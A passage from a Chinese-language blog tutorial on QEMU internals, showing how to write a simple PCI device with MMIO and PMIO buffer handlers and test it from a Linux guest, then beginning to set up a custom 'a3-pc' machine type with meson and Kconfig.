class="hljs-comment">         * 否则所有的访问都将被转换为（可能多种）对齐的访问.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> unaligned;<br>    &#125; impl;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们的 Guest 要读写虚拟机上的内存时，在 Qemu 内部实际上会调用 <code>address_space_rw()</code>，对于一般的 RAM 内存而言则直接对 MR 对应的内存进行操作，对于 MMIO 而言则最终调用到对应的 <code>MR-&gt;ops-&gt;read()</code> 或 <code>MR-&gt;ops-&gt;write()</code></p><p>关于 Qemu 内存管理更多的内容就暂且不在此展开了，不过现在我们知道的是在 Qemu 中使用 <code>MemoryRegion</code> 结构体来表示一段内存区域，<strong>那么我们同样可以通过在设备中添加 MemoryRegion 的方式来为设备添加内存，从而实现与设备间的 MMIO 通信</strong></p><p>同样的，为了统一接口，在 Qemu 当中 <strong>PMIO 的实现同样是通过 MemoryRegion 来完成的</strong></p><h2 id="三、Qemu-中-PCI-设备的编写"><a href="#三、Qemu-中-PCI-设备的编写" class="headerlink" title="三、Qemu 中 PCI 设备的编写"></a>三、Qemu 中 PCI 设备的编写</h2><p>在补充了这么多的 Qemu 相关的知识之后，现在我们可以开始在 Qemu 中编写 PCI 设备了，这里笔者将编写一个最简单的 Qemu 设备，并将源码放在 <code>hw/misc/a3dev.c</code> 中</p><p>Qemu 当中 PCI 设备实例的基类是 <code>PCIDevice</code>，因此我们应当创建一个继承自 <code>PCIDevice</code> 的类来表示我们的设备实例，这里笔者仅声明了两个 <code>MemoryRegion</code> 用作 MMIO 与 PMIO，以及一个用作数据存储的 buffer：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_BUF_SIZE 0x100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint8_t</span> buf[A3DEV_BUF_SIZE];<br>&#125; A3PCIDevState;<br></code></pre></td></tr></table></figure><p>以及定义一个空的 Class 模板，继承自 PCI 设备的静态类型 <code>PCIDeviceClass</code>，不过这一步并不是必须的，事实上我们可以直接用 <code>PCIDeviceClass</code> 作为我们设备类的 Class：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br></code></pre></td></tr></table></figure><p>以及两个将父类转为子类的宏，因为 QOM 基本函数传递的大都是父类指针，所以我们需要一个宏来进行类型检查 + 转型，这也是 Qemu 中惯用的做法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br></code></pre></td></tr></table></figure><p>下面我们开始定义 MMIO 与 PMIO 的操作函数，这里笔者就简单地设置为读写设备内部的 buffer，并声明上两个 MemoryRegion 对应的函数表，需要注意的是这里传入的 <code>hwaddr</code> 类型参数其实为相对地址而非绝对地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br>    <span class="hljs-type">uint64_t</span> val = ~<span class="hljs-number">0LL</span>;<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> val;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> val;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;val, &amp;ds-&gt;buf[addr], size);<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> ;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> ;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;ds-&gt;buf[addr], &amp;val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后是设备实例的初始化函数，在 <code>PCIDeviceClass</code> 当中定义了一个名为 <code>realize</code> 的函数指针，当 PCI 设备被载入时便会调用这个函数指针指向的函数来初始化，所以这里我们也定义一个自己的初始化函数，不过我们需要做的工作其实基本上就只有初始化两个 <code>MemoryRegion</code>，<code>memory_region_init_io()</code> 会为这两个 <code>MemoryRegion</code> 进行初始化的工作，并设置函数表为我们指定的函数表，<code>pci_register_bar()</code> 则用来注册 BAR：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是 Class 与 Object（也就是 instance）的初始化函数，这里需要注意的是在 Class 的初始化函数中我们应当设置父类 <code>PCIDeviceClass</code> 的一系列基本属性（也就是 PCI 设备的基本属性）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后就是为我们的 PCI 设备类型注册 TypeInfo 了，这里别忘了<strong>我们的接口中应当增加上 PCI 的接口</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><p>最后我们在 meson 构建系统中加入我们新增的这个设备，在 <code>hw/misc/meson.build</code> 中加入如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">softmmu_ss.add(when: &#x27;CONFIG_PCI_A3DEV&#x27;, if_true: files(&#x27;a3dev.c&#x27;))<br></code></pre></td></tr></table></figure><p>并在 <code>hw/misc/Kconfig</code> 中添加如下内容，这表示我们的设备会在 <code>CONFIG_PCI_DEVICES=y</code> 时编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config PCI_A3DEV<br>    bool<br>    default y if PCI_DEVICES<br>    depends on PCI<br></code></pre></td></tr></table></figure><p>之后编译 Qemu 并附加上 <code>-device a3dev-pci</code> ，之后随便起一个 Linux 系统，此时使用 <code>lspci</code> 指令我们便能看到我们新添加的 pci 设备：</p><p><img src="https://s2.loli.net/2022/07/28/Eu82rKgSlJBtbic.png" alt="image.png"></p><p>我们使用如下程序来测试我们的设备的输入输出，需要注意的是这需要 root 权限：</p><blockquote><p>PMIO，使用 iopl 更改端口权限后便能通过 in&#x2F;out 类指令读写端口</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port_addr;<br><br>        <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no port provided!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no privilege!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        port_addr = atoi(argv[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] a3dev port addr start at: %d\n&quot;</span>, port_addr);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] now writing into a3dev-pci...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                outl(i, port_addr + i * <span class="hljs-number">4</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] writing done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] now reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%d--]&quot;</span>, port_addr + i * <span class="hljs-number">4</span>);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, inl(port_addr + i * <span class="hljs-number">4</span>));<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] reading done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>PMIO 测试成功，设备读写功能正常：</p><p><img src="https://s2.loli.net/2022/07/28/k4G1cOvNHwUtsjQ.png" alt="image.png"></p><blockquote><p>MMIO，使用 mmap 映射 <code>sys</code> 目录下设备的 <code>resource0</code> 文件即可直接读写</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> val)</span><br>&#123;<br>        *addr = val;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr)</span><br>&#123;<br>        <span class="hljs-keyword">return</span> *addr;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">uint32_t</span> *mmio_addr;<br>        <span class="hljs-type">int</span> dev_fd;<br><br>        dev_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,<br>                        O_RDWR | O_SYNC);<br>        <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to open mmio file! wrong path or no root!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        mmio_addr = (<span class="hljs-type">uint32_t</span>*)<br>                mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (mmio_addr == MAP_FAILED) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed to mmap!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start writing to a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                mmio_write(mmio_addr + i, i);<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%p--]&quot;</span>, mmio_addr);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %u &quot;</span>, mmio_read(mmio_addr + i));<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] read done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>MMIO 测试成功，设备读写功能正常：</p><p><img src="https://s2.loli.net/2022/07/28/RCoHF7SWPIyD54j.png" alt="image.png"></p><h1 id="0x04-自定义-QEMU-机器类型"><a href="#0x04-自定义-QEMU-机器类型" class="headerlink" title="0x04.自定义 QEMU 机器类型"></a>0x04.自定义 QEMU 机器类型</h1><p>众所周知在 Qemu 当中有很多种不同的机器类型，其表示着包含一些默认设备（包含PCIe显卡、以太网控制器、SATA控制器等）的虚拟芯片组，例如 <code>pc</code> 对应于 Intel 的 <code>440FX</code> 芯片组（这也是 Qemu 默认选择的机器类型）</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>Qemu 主要支持两种大的 x86 芯片组：i440FX 和 Q35，后者相比前者而言的一个大的亮点便是增加了对 PCIe 的支持：</p><p><img src="https://s2.loli.net/2022/07/14/2xgwV7GeSskzWc4.png" alt="image.png"></p><p>我们可以使用 <code>-machine</code> 选项来指定我们要创建的虚拟机的机器类型，通过 <code>-machine ?</code> 选项可以查看当前支持的机器类型：</p><p><img src="https://s2.loli.net/2022/07/14/v6G5DV4SK7hCbRZ.png" alt="image.png"></p><p>但自带的机器类型通常往往无法满足我们多样化的要求，因此有的时候我们需要自行编写一种机器类型来满足我们的需求</p><h2 id="一、添加源码文件与编译选项"><a href="#一、添加源码文件与编译选项" class="headerlink" title="一、添加源码文件与编译选项"></a>一、添加源码文件与编译选项</h2><p>在 Qemu 源码目录中，与具体支持的硬件相关的代码都放在 <code>hw/</code> 目录下，例如默认的 <code>PC</code> 架构便定义于 <code>hw/i386/pc.c</code>，因此若是我们想要定义一种新的机器类型则在该目录下进行定义是最好的</p><p>老版本的 Qemu 是纯粹基于 Makefile 进行构建的，而现在的新版本 Qemu 中则是使用 meson 进行项目构建，因此笔者接下来将会同时介绍两种配置方法</p><h3 id="I、新版本-Qemu-配置方式（meson）"><a href="#I、新版本-Qemu-配置方式（meson）" class="headerlink" title="I、新版本 Qemu 配置方式（meson）"></a>I、新版本 Qemu 配置方式（meson）</h3><p>这里我们选择定义一种新的机器类型名为 <code>a3-pc</code>，并在 <code>hw/i386/a3-pc</code> 下创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree hw/i386/a3-pc/</span><br>hw/i386/a3-pc/<br>├── accel.c<br>├── machine.c<br>└── meson.build<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>三个文件说明如下：</p><ul><li><code>meson.build</code>：meson 项目构建文件</li><li><code>machine.c</code>：机器的主体代码</li><li><code>accel.c</code>：自定义的 accelerator 代码</li></ul><p>在 <code>meson.build</code> 中写入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3pc_ss = ss.source_set()<br>a3pc_ss.add(files(&#x27;accel.c&#x27;))<br>a3pc_ss.add(files(&#x27;machine.c&#x27;))<br><br>i386_ss.add_all(when: &#x27;CONFIG_A3_PC&#x27;, if_true: a3pc_ss)<br></code></pre></td></tr></table></figure><p>之后在 <code>hw/i386/meson.build</code> 中添加该语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">subdir(&#x27;a3-pc&#x27;)<br></code></pre></td></tr></table></figure><p>这里笔者选择创建一个 i386 类型的机器，因此我们还需要修改 <code>hw/i386/Kconfig</code>，添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>在 <code>configs/devices/i386-softmmu/default.mak</code> 末尾添加如下内容，使得我们的新的机器类型会被默认编译进去：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_A3_PC=y<br></code></pre></td></tr></table></figure><h3 